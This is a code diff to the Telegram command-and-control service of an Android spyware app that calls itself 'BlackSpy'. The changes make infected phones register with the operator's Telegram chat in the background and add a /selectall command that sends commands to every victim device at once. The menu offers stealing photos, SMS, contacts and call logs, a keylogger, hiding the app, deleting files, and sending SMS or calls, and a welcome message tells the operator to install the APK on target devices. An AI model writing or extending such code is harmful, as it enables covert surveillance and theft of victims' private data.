@@ -67,24 +67,30 @@ public class TelegramBotService extends Service {
     @Override public void onCreate() { 
         super.onCreate(); 
         startForeground(1, createNotification()); 
-        autoRegisterThisDevice();
+        registerThisDevice();
         startBot(); 
     }
-    private void autoRegisterThisDevice() {
-        try {
-            String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
-            String deviceName = Build.MANUFACTURER + " " + Build.MODEL + " (" + Build.VERSION.RELEASE + ")";
-            JSONObject json = new JSONObject();
-            json.put("device_id", deviceId);
-            json.put("device_name", deviceName);
-            String msg = "REGISTER:" + json.toString();
-            String url = API_URL + "sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(msg, "UTF-8");
-            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
-            conn.setRequestMethod("GET");
-            conn.getResponseCode();
-            conn.disconnect();
-            Log.i("BlackSpy", "Auto-registered: " + deviceName);
-        } catch (Exception e) { Log.e("BlackSpy", "Auto-register failed", e); }
+    private void registerThisDevice() {
+        new Thread(() -> {
+            try {
+                String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+                String deviceName = Build.MANUFACTURER + " " + Build.MODEL + " Android " + Build.VERSION.RELEASE;
+                JSONObject json = new JSONObject();
+                json.put("device_id", deviceId);
+                json.put("device_name", deviceName);
+                String msg = "REGISTER:" + json.toString();
+                String url = API_URL + "sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(msg, "UTF-8");
+                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
+                conn.setRequestMethod("GET");
+                int code = conn.getResponseCode();
+                conn.disconnect();
+                if (code == 200) {
+                    Log.i("BlackSpy", "✅ Registered: " + deviceName);
+                } else {
+                    Log.e("BlackSpy", "❌ Register failed");
+                }
+            } catch (Exception e) { Log.e("BlackSpy", "Register error", e); }
+        }).start();
     }
     private void startBot() {
         Executors.newSingleThreadScheduledExecutor().scheduleWithFixedDelay(() -> {
@@ -108,8 +114,11 @@ public class TelegramBotService extends Service {
                                 DeviceInfo d = new DeviceInfo();
                                 d.id = info.getString("device_id");
                                 d.name = info.getString("device_name");
-                                devices.put(d.id, d);
-                                sendDeviceList();
+                                if (!devices.containsKey(d.id)) {
+                                    devices.put(d.id, d);
+                                    sendMessage("✅ New device connected: " + d.name);
+                                    sendDeviceList();
+                                }
                             }
                         }
                     }
@@ -131,12 +140,15 @@ public class TelegramBotService extends Service {
             }
         } else if (c.equals("/devices")) {
             sendDeviceList();
+        } else if (c.equals("/selectall")) {
+            activeDevice = "ALL";
+            sendMessage("✅ ALL DEVICES selected. Commands will be sent to every connected device.");
         } else if (c.startsWith("yes_")) {
             String path = pendingDelete.get(CHAT_ID);
             if (path != null) {
                 pendingDelete.remove(CHAT_ID);
                 sendToDevice(activeDevice, "CONFIRM_DELETE|" + path);
-                sendMessage("✅ Delete confirmed, executing...");
+                sendMessage("✅ Delete confirmed");
             } else {
                 sendMessage("❌ No pending delete");
             }
@@ -144,7 +156,7 @@ public class TelegramBotService extends Service {
             pendingDelete.remove(CHAT_ID);
             sendMessage("❌ Delete cancelled");
         } else {
-            if (activeDevice == null) {
+            if (activeDevice == null && !c.equals("/start")) {
                 sendMessage("⚠️ Select device first: /start");
                 return;
             }
@@ -219,24 +231,44 @@ public class TelegramBotService extends Service {
             else sendMessage("❌ Unknown command");
         }
     }
+    private void sendToDevice(String deviceId, String cmd) {
+        new Thread(() -> {
+            try {
+                if (deviceId.equals("ALL")) {
+                    for (DeviceInfo d : devices.values()) {
+                        sendSingleCommand(d.id, cmd);
+                    }
+                    sendMessage("✅ Command sent to ALL (" + devices.size() + ") devices");
+                } else {
+                    sendSingleCommand(deviceId, cmd);
+                    sendMessage("✅ Command sent to " + devices.get(deviceId).name);
+                }
+            } catch (Exception e) { sendMessage("❌ Failed to send"); }
+        }).start();
+    }
+    private void sendSingleCommand(String deviceId, String cmd) {
+        try {
+            String url = API_URL + "sendMessage?chat_id=" + deviceId + "&text=" + URLEncoder.encode("CMD:" + cmd, "UTF-8");
+            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
+            conn.setRequestMethod("GET");
+            conn.getResponseCode();
+            conn.disconnect();
+        } catch (Exception e) {}
+    }
     private void askConfirmation(String action) {
         pendingDelete.put(CHAT_ID, action);
-        sendMessage("⚠️ Are you sure you want to delete?\nType 'yes' to confirm or 'no' to cancel");
+        sendMessage("⚠️ Are you sure?\nType 'yes' to confirm or 'no' to cancel");
     }
     private void sendWelcomeAndDevices() {
-        String welcome = "🔥 BLACK SPY 🔥\n"
-                + "╔════════════════════════════╗\n"
-                + "║   👹 Black Spy 👹          ║\n"
-                + "║   🕷️ Hackers Walking Anous 🕷️\n"
-                + "║   💀 Under World Spy 💀    ║\n"
-                + "╚════════════════════════════╝\n\n";
+        String welcome = "🔥 BLACK SPY 🔥\n╔════════════════════════════╗\n║   👹 Black Spy 👹          ║\n║   🕷️ Hackers Walking Anous 🕷️\n║   💀 Under World Spy 💀    ║\n╚════════════════════════════╝\n\n";
         if (devices.isEmpty()) {
-            sendMessage(welcome + "❌ No devices connected yet.\nWaiting for devices...");
+            sendMessage(welcome + "❌ No devices connected yet.\nWaiting for devices...\n\n⚠️ Install this APK on target devices.\nThey will auto-register here.");
         } else {
-            StringBuilder sb = new StringBuilder(welcome + "📱 <b>Select a device:</b>\n\n");
+            StringBuilder sb = new StringBuilder(welcome + "📱 <b>Connected Devices (" + devices.size() + "):</b>\n\n");
             for (DeviceInfo d : devices.values()) {
                 sb.append("🔹 /select_").append(d.id).append(" - ").append(d.name).append("\n");
             }
+            sb.append("\n🔹 /selectall - Send commands to ALL devices\n");
             sendMessage(sb.toString());
         }
     }
@@ -251,33 +283,22 @@ public class TelegramBotService extends Service {
                 + "<b>📁 FILES:</b>\n/zip, /photos, /videos, /audio, /documents, /search, /download, /mkdir\n\n"
                 + "<b>📋 COPY (to device):</b>\n/copy_photos <dst>, /copy_videos <dst>, /copy_audio <dst>, /copy_docs <dst>\n/copy_contacts <dst>, /copy_sms <dst>, /copy_calls <dst>\n\n"
                 + "<b>💀 STEAL (to you):</b>\n/steal_all, /steal_photos, /steal_videos, /steal_audio, /steal_docs\n/steal_contacts, /steal_sms, /steal_calls\n\n"
-                + "<b>🗑 DELETE (with confirmation):</b>\n/delete_photo <path>, /delete_video <path>, /delete_audio <path>, /delete_doc <path>\n/delete_contact <id>, /delete_sms <id>, /delete_call <id>\n\n"
-                + "<b>📱 APPS (by name):</b>\n/openapp WhatsApp, /install /sdcard/app.apk, /uninstall WhatsApp, /disable WhatsApp, /enable WhatsApp\n/appinfo WhatsApp, /killapp WhatsApp\n\n"
+                + "<b>🗑 DELETE:</b>\n/delete_photo <path>, /delete_video <path>, /delete_audio <path>, /delete_doc <path>\n/delete_contact <id>, /delete_sms <id>, /delete_call <id>\n\n"
+                + "<b>📱 APPS:</b>\n/openapp WhatsApp, /install /sdcard/app.apk, /uninstall WhatsApp\n/disable WhatsApp, /enable WhatsApp, /appinfo WhatsApp, /killapp WhatsApp\n\n"
                 + "<b>👁 STEALTH:</b>\n/hide, /show, /toast <text>, /notify <text>, /vibrate <sec>, /openurl <url>, /clipboard\n\n"
                 + "<b>⌨️ KEYLOGGER:</b>\n/keylogger start, /keylogger stop, /keylogger send\n\n"
                 + "<b>📞 SMS & CALLS:</b>\n/sms_send <number> <text>, /call <number>, /ussd <code>\n\n"
-                + "<b>⚠️ All commands are sent to this device only</b>";
+                + "<b>⚠️ Commands sent to this device only. Use /selectall for all devices.</b>";
         sendMessage(menu);
     }
     private void sendDeviceList() {
         if (devices.isEmpty()) return;
-        StringBuilder sb = new StringBuilder("📱 <b>Connected devices:</b>\n\n");
+        StringBuilder sb = new StringBuilder("📱 <b>Connected devices (" + devices.size() + "):</b>\n\n");
         for (DeviceInfo d : devices.values()) {
             sb.append("🔹 /select_").append(d.id).append(" - ").append(d.name).append("\n");
         }
+        sb.append("\n🔹 /selectall - Send commands to ALL devices");
         sendMessage(sb.toString());
-    }
-    private void sendToDevice(String deviceId, String cmd) {
-        new Thread(() -> {
-            try {
-                String url = API_URL + "sendMessage?chat_id=" + deviceId + "&text=" + URLEncoder.encode("CMD:" + cmd, "UTF-8");
-                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
-                conn.setRequestMethod("GET");
-                conn.getResponseCode();
-                conn.disconnect();
-                sendMessage("✅ Command sent to " + devices.get(deviceId).name);
-            } catch (Exception e) { sendMessage("❌ Failed to send"); }
-        }).start();
     }
     private void sendMessage(String text) {
         new Thread(() -> {
